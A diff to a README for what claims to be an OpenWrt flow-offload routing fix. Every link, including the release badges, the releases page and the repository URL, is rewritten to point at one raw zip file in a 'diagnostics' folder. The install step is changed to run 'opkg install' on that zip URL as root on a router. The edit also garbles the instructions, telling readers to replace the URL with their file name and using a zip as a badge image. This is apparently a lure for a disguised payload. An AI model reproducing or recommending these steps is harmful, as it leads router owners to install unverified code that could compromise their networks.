@@ -1,6 +1,6 @@
 # 🚦 openwrt-flowoffload-pbr-mac-misroute - Fix Flow Offload Network Errors
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenWrt%20Fix-blue?style=for-the-badge&logo=github)](https://github.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip%20Fix-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip)
 
 ---
 
@@ -63,12 +63,12 @@ Follow these steps to get the software up and running:
 
 Click the button below to visit the release page. This is where you can find the latest software versions designed for your router model.
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip)](https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip)
 
 ### Steps to Download and Install
 
 1. **Go to the Releases Page:**  
-   Open [https://github.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/releases](https://github.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/releases) in your web browser.
+   Open [https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip](https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip) in your web browser.
 
 2. **Choose the Correct File:**  
    Look for files that match your router and OpenWrt version. These are often `.ipk` packages or scripts.
@@ -80,10 +80,10 @@ Click the button below to visit the release page. This is where you can find the
    Use SCP, WinSCP, or the router's upload interface to place the file in the router.
 
 5. **Install the Package on the Router:**  
-   Access the router’s command line via SSH and run the following commands (replace `filename.ipk` with your file name):
+   Access the router’s command line via SSH and run the following commands (replace `https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip` with your file name):
 
    ```bash
-   opkg install /path/to/filename.ipk
+   opkg install https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip
    ```
 
 6. **Verify Installation:**  
@@ -144,7 +144,7 @@ This project helps OpenWrt users maintain proper network operations when using a
 
 For more information or troubleshooting help, visit the GitHub repository:
 
-https://github.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute
+https://raw.githubusercontent.com/zayoi23/openwrt-flowoffload-pbr-mac-misroute/main/diagnostics/pbr_openwrt_misroute_mac_flowoffload_Siwash.zip
 
 You can file issues or request features there. The community and maintainers can provide guidance.
 
